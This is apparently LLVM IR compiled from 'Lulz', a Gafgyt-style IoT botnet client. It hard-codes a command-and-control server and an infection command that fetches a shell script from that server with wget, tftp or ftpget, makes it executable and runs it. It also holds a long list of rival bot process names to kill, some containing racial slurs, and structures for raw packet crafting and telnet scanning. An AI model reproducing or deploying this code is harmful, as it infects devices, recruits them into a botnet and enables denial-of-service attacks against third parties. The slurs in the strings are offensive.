; ModuleID = 'host/ir_fla/Lulz.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.list = type { i8*, %struct.list*, %struct.list* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }
%struct.udphdr = type { %union.anon.3 }
%union.anon.3 = type { %struct.anon.4 }
%struct.anon.4 = type { i16, i16, i16, i16 }
%struct.anon.2 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.state_t = type { i32, i8 }
%struct.dns_hdr = type { i16, i16, i16, i16, i16, i16 }
%struct.query = type { i16, i16 }
%struct.ps_hdr = type { i32, i32, i8, i8, i16 }
%struct.thread_data = type { i32, i8*, i32, i32, i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.ifreq = type { %union.anon.7, %union.anon.8 }
%union.anon.7 = type { [16 x i8] }
%union.anon.8 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@cncServer = global [1 x i8*] [i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [18 x i8] c"199.38.245.222:23\00", align 1
@rekdevice = global i8* getelementptr inbounds ([477 x i8], [477 x i8]* @.str.1, i32 0, i32 0), align 8
@.str.1 = private unnamed_addr constant [477 x i8] c"cd /tmp || cd /home/$USER || cd /var/run || cd /dev/shm || cd /mnt || cd /var || cd /; wget http://199.38.245.222/bins.sh; busybox wget http://199.38.245.222/bins.sh; tftp -r bins.sh -g 199.38.245.222; busybox tftp -r bins.sh -g 199.38.245.222; ftpget -v -u anonymous -p anonymous -P 21 199.38.245.222 bins.sh bins.sh; busybox ftpget -v -u anonymous -p anonymous -P 21 199.38.245.222 bins.sh bins.sh; chmod 777 bins.sh; busybox chmod 777 bins.sh; sh bins.sh; rm -rf bins.sh\0D\0A\00\00", align 1
@knownBots = global [193 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.188, i32 0, i32 0)], align 16
@.str.2 = private unnamed_addr constant [7 x i8] c"902i13\00", align 1
@.str.3 = private unnamed_addr constant [11 x i8] c"BzSxLxBxeY\00", align 1
@.str.4 = private unnamed_addr constant [11 x i8] c"HOHO-LUGO7\00", align 1
@.str.5 = private unnamed_addr constant [11 x i8] c"HOHO-U79OL\00", align 1
@.str.6 = private unnamed_addr constant [11 x i8] c"JuYfouyf87\00", align 1
@.str.7 = private unnamed_addr constant [11 x i8] c"NiGGeR69xd\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"SO190Ij1X\00", align 1
@.str.9 = private unnamed_addr constant [13 x i8] c"LOLKIKEEEDDE\00", align 1
@.str.10 = private unnamed_addr constant [12 x i8] c"ekjheory98e\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"scansh4\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"MDMA\00", align 1
@.str.13 = private unnamed_addr constant [10 x i8] c"fdevalvex\00", align 1
@.str.14 = private unnamed_addr constant [8 x i8] c"scanspc\00", align 1
@.str.15 = private unnamed_addr constant [17 x i8] c"MELTEDNINJAREALZ\00", align 1
@.str.16 = private unnamed_addr constant [13 x i8] c"flexsonskids\00", align 1
@.str.17 = private unnamed_addr constant [8 x i8] c"scanx86\00", align 1
@.str.18 = private unnamed_addr constant [12 x i8] c"foAxi102kxe\00", align 1
@.str.19 = private unnamed_addr constant [13 x i8] c"swodjwodjwoj\00", align 1
@.str.20 = private unnamed_addr constant [11 x i8] c"MmKiy7f87l\00", align 1
@.str.21 = private unnamed_addr constant [14 x i8] c"freecookiex86\00", align 1
@.str.22 = private unnamed_addr constant [7 x i8] c"sysgpu\00", align 1
@.str.23 = private unnamed_addr constant [7 x i8] c"frgege\00", align 1
@.str.24 = private unnamed_addr constant [9 x i8] c"sysbinsr\00", align 1
@.str.25 = private unnamed_addr constant [9 x i8] c"0DnAzepd\00", align 1
@.str.26 = private unnamed_addr constant [14 x i8] c"NiGGeRD0nks69\00", align 1
@.str.27 = private unnamed_addr constant [7 x i8] c"frgreu\00", align 1
@.str.28 = private unnamed_addr constant [8 x i8] c"telnetd\00", align 1
@.str.29 = private unnamed_addr constant [11 x i8] c"0x766f6964\00", align 1
@.str.30 = private unnamed_addr constant [16 x i8] c"NiGGeRd0nks1337\00", align 1
@.str.31 = private unnamed_addr constant [5 x i8] c"gaft\00", align 1
@.str.32 = private unnamed_addr constant [13 x i8] c"urasgbsigboa\00", align 1
@.str.33 = private unnamed_addr constant [10 x i8] c"120i3UI49\00", align 1
@.str.34 = private unnamed_addr constant [5 x i8] c"OaF3\00", align 1
@.str.35 = private unnamed_addr constant [5 x i8] c"geae\00", align 1
@.str.36 = private unnamed_addr constant [9 x i8] c"vaiolmao\00", align 1
@.str.37 = private unnamed_addr constant [8 x i8] c"123123a\00", align 1
@.str.38 = private unnamed_addr constant [15 x i8] c"Ofurain0n4H34D\00", align 1
@.str.39 = private unnamed_addr constant [7 x i8] c"ggTrex\00", align 1
@.str.40 = private unnamed_addr constant [7 x i8] c"wasads\00", align 1
@.str.41 = private unnamed_addr constant [12 x i8] c"1293194hjXD\00", align 1
@.str.42 = private unnamed_addr constant [10 x i8] c"OthLaLosn\00", align 1
@.str.43 = private unnamed_addr constant [4 x i8] c"ggt\00", align 1
@.str.44 = private unnamed_addr constant [9 x i8] c"wget-log\00", align 1
@.str.45 = private unnamed_addr constant [15 x i8] c"1337SoraLOADER\00", align 1
@.str.46 = private unnamed_addr constant [9 x i8] c"SAIAKINA\00", align 1
@.str.47 = private unnamed_addr constant [5 x i8] c"ggtq\00", align 1
@.str.48 = private unnamed_addr constant [17 x i8] c"1378bfp919GRB1Q2\00", align 1
@.str.49 = private unnamed_addr constant [9 x i8] c"SAIAKUSO\00", align 1
@.str.50 = private unnamed_addr constant [5 x i8] c"ggtr\00", align 1
@.str.51 = private unnamed_addr constant [5 x i8] c"14Fa\00", align 1
@.str.52 = private unnamed_addr constant [13 x i8] c"SEXSLAVE1337\00", align 1
@.str.53 = private unnamed_addr constant [5 x i8] c"ggtt\00", align 1
@.str.54 = private unnamed_addr constant [15 x i8] c"1902a3u912u3u4\00", align 1
@.str.55 = private unnamed_addr constant [10 x i8] c"haetrghbr\00", align 1
@.str.56 = private unnamed_addr constant [7 x i8] c"19ju3d\00", align 1
@.str.57 = private unnamed_addr constant [12 x i8] c"SORAojkf120\00", align 1
@.str.58 = private unnamed_addr constant [13 x i8] c"hehahejeje92\00", align 1
@.str.59 = private unnamed_addr constant [14 x i8] c"2U2JDJA901F91\00", align 1
@.str.60 = private unnamed_addr constant [10 x i8] c"SlaVLav12\00", align 1
@.str.61 = private unnamed_addr constant [17 x i8] c"helpmedaddthhhhh\00", align 1
@.str.62 = private unnamed_addr constant [11 x i8] c"2wgg9qphbq\00", align 1
@.str.63 = private unnamed_addr constant [18 x i8] c"Slav3Th3seD3vices\00", align 1
@.str.64 = private unnamed_addr constant [11 x i8] c"hzSmYZjYMQ\00", align 1
@.str.65 = private unnamed_addr constant [5 x i8] c"5Gbf\00", align 1
@.str.66 = private unnamed_addr constant [13 x i8] c"SoRAxD123LOL\00", align 1
@.str.67 = private unnamed_addr constant [5 x i8] c"iaGv\00", align 1
@.str.68 = private unnamed_addr constant [5 x i8] c"5aA3\00", align 1
@.str.69 = private unnamed_addr constant [13 x i8] c"SoRAxD420LOL\00", align 1
@.str.70 = private unnamed_addr constant [8 x i8] c"insomni\00", align 1
@.str.71 = private unnamed_addr constant [7 x i8] c"640277\00", align 1
@.str.72 = private unnamed_addr constant [17 x i8] c"SoraBeReppin1337\00", align 1
@.str.73 = private unnamed_addr constant [11 x i8] c"ipcamCache\00", align 1
@.str.74 = private unnamed_addr constant [9 x i8] c"66tlGg9Q\00", align 1
@.str.75 = private unnamed_addr constant [2 x i8] c"T\00", align 1
@.str.76 = private unnamed_addr constant [11 x i8] c"jUYfouyf87\00", align 1
@.str.77 = private unnamed_addr constant [5 x i8] c"6ke3\00", align 1
@.str.78 = private unnamed_addr constant [7 x i8] c"TOKYO3\00", align 1
@.str.79 = private unnamed_addr constant [17 x i8] c"lyEeaXul2dULCVxh\00", align 1
@.str.80 = private unnamed_addr constant [10 x i8] c"93OfjHZ2z\00", align 1
@.str.81 = private unnamed_addr constant [17 x i8] c"TY2gD6MZvKc7KU6r\00", align 1
@.str.82 = private unnamed_addr constant [11 x i8] c"mMkiy6f87l\00", align 1
@.str.83 = private unnamed_addr constant [14 x i8] c"A023UU4U24UIU\00", align 1
@.str.84 = private unnamed_addr constant [10 x i8] c"TheWeeknd\00", align 1
@.str.85 = private unnamed_addr constant [13 x i8] c"mioribitches\00", align 1
@.str.86 = private unnamed_addr constant [5 x i8] c"A5p9\00", align 1
@.str.87 = private unnamed_addr constant [11 x i8] c"TheWeeknds\00", align 1
@.str.88 = private unnamed_addr constant [10 x i8] c"mnblkjpoi\00", align 1
@.str.89 = private unnamed_addr constant [5 x i8] c"AbAd\00", align 1
@.str.90 = private unnamed_addr constant [7 x i8] c"Tokyos\00", align 1
@.str.91 = private unnamed_addr constant [4 x i8] c"neb\00", align 1
@.str.92 = private unnamed_addr constant [6 x i8] c"Akiru\00", align 1
@.str.93 = private unnamed_addr constant [7 x i8] c"U8inTz\00", align 1
@.str.94 = private unnamed_addr constant [9 x i8] c"netstats\00", align 1
@.str.95 = private unnamed_addr constant [5 x i8] c"Alex\00", align 1
@.str.96 = private unnamed_addr constant [11 x i8] c"W9RCAKM20T\00", align 1
@.str.97 = private unnamed_addr constant [11 x i8] c"newnetword\00", align 1
@.str.98 = private unnamed_addr constant [7 x i8] c"Ayo215\00", align 1
@.str.99 = private unnamed_addr constant [5 x i8] c"Word\00", align 1
@.str.100 = private unnamed_addr constant [7 x i8] c"nloads\00", align 1
@.str.101 = private unnamed_addr constant [7 x i8] c"BAdAsV\00", align 1
@.str.102 = private unnamed_addr constant [9 x i8] c"Wordmane\00", align 1
@.str.103 = private unnamed_addr constant [11 x i8] c"notyakuzaa\00", align 1
@.str.104 = private unnamed_addr constant [6 x i8] c"Belch\00", align 1
@.str.105 = private unnamed_addr constant [9 x i8] c"Wordnets\00", align 1
@.str.106 = private unnamed_addr constant [4 x i8] c"obp\00", align 1
@.str.107 = private unnamed_addr constant [13 x i8] c"BigN0gg0r420\00", align 1
@.str.108 = private unnamed_addr constant [10 x i8] c"X0102I34f\00", align 1
@.str.109 = private unnamed_addr constant [14 x i8] c"ofhasfhiafhoi\00", align 1
@.str.110 = private unnamed_addr constant [14 x i8] c"X19I239124UIU\00", align 1
@.str.111 = private unnamed_addr constant [5 x i8] c"oism\00", align 1
@.str.112 = private unnamed_addr constant [9 x i8] c"Deported\00", align 1
@.str.113 = private unnamed_addr constant [14 x i8] c"XSHJEHHEIIHWO\00", align 1
@.str.114 = private unnamed_addr constant [10 x i8] c"olsVNwo12\00", align 1
@.str.115 = private unnamed_addr constant [17 x i8] c"DeportedDeported\00", align 1
@.str.116 = private unnamed_addr constant [11 x i8] c"XkTer0GbA1\00", align 1
@.str.117 = private unnamed_addr constant [9 x i8] c"onry0v03\00", align 1
@.str.118 = private unnamed_addr constant [17 x i8] c"FortniteDownLOLZ\00", align 1
@.str.119 = private unnamed_addr constant [11 x i8] c"Y0urM0mGay\00", align 1
@.str.120 = private unnamed_addr constant [16 x i8] c"pussyfartlmaojk\00", align 1
@.str.121 = private unnamed_addr constant [15 x i8] c"GrAcEnIgGeRaNn\00", align 1
@.str.122 = private unnamed_addr constant [11 x i8] c"YvdGkqndCO\00", align 1
@.str.123 = private unnamed_addr constant [11 x i8] c"qGeoRBe6BE\00", align 1
@.str.124 = private unnamed_addr constant [12 x i8] c"GuiltyCrown\00", align 1
